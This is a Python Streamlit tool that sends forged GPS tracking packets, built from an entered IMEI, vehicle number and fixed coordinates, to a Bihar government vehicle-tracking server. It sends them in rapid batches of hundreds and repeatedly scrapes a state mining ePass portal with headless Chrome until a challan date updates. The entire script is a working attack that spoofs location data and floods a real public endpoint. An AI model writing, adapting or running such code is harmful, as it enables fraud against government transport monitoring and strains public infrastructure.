import streamlit as st
import socket
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import os

# --- Page Setup ---
st.set_page_config(page_title="GATLING NITRO V92", page_icon="🚀", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000; color: #0f0; }
    div.stButton > button {
        background-color: #004400; color: white; border-radius: 8px; font-weight: bold; width: 100%; height: 3.5em;
    }
    .stMetric { background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V92")
st.caption("Enterprise Edition - Chrome Sync Fixed")

# --- States ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0
if 'last_portal_update' not in st.session_state:
    st.session_state.last_portal_update = "IDLE"

# --- Sidebar ---
with st.sidebar:
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)

# --- Control Panel ---
c1, c2 = st.columns(2)
if c1.button("🔥 START ENGINE", disabled=st.session_state.firing):
    st.session_state.firing = True
    st.rerun()

if c2.button("🛑 STOP & RESET"):
    st.session_state.firing = False
    st.session_state.total_count = 0
    st.session_state.last_portal_update = "IDLE"
    st.rerun()

st.divider()
m1 = st.empty()
m2 = st.empty()

# --- Chrome Silent Setup ---
def get_silent_driver():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--log-level=3") # Fatal errors only
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    # Path selection for Streamlit Cloud
    for path in ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]:
        if os.path.exists(path):
            options.binary_location = path
            break
    return webdriver.Chrome(options=options)

# --- Main Execution ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    
    try:
        if mode == "TCP":
            sock.settimeout(2)
            sock.connect(target)
            
        while st.session_state.firing:
            # 1. Packet Batch
            now = datetime.now()
            p = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
            
            for _ in range(100):
                sock.sendto(p, target) if mode == "UDP" else sock.send(p)
            
            st.session_state.total_count += 100
            
            # 2. Scraper Check (Every 1000 packets)
            if st.session_state.total_count % 1000 == 0:
                try:
                    driver = get_silent_driver()
                    driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
                    time.sleep(1)
                    driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
                    driver.execute_script("__doPostBack('btnSearch','');")
                    time.sleep(1)
                    
                    res = driver.execute_script("""
                        var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                        return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
                    """)
                    
                    if res:
                        st.session_state.last_portal_update = res
                        if now.strftime("%d-%b-%Y").upper() in res.upper():
                            st.session_state.firing = False
                    driver.quit()
                except:
                    pass
            
            # 3. Force UI Update
            m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
            m2.metric("Latest Portal Update", st.session_state.last_portal_update)
            
            time.sleep(0.05)
            
    except Exception:
        st.session_state.firing = False
    finally:
        sock.close()
        if st.session_state.firing: st.rerun()
else:
    m1.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
    m2.metric("Latest Portal Update", st.session_state.last_portal_update)
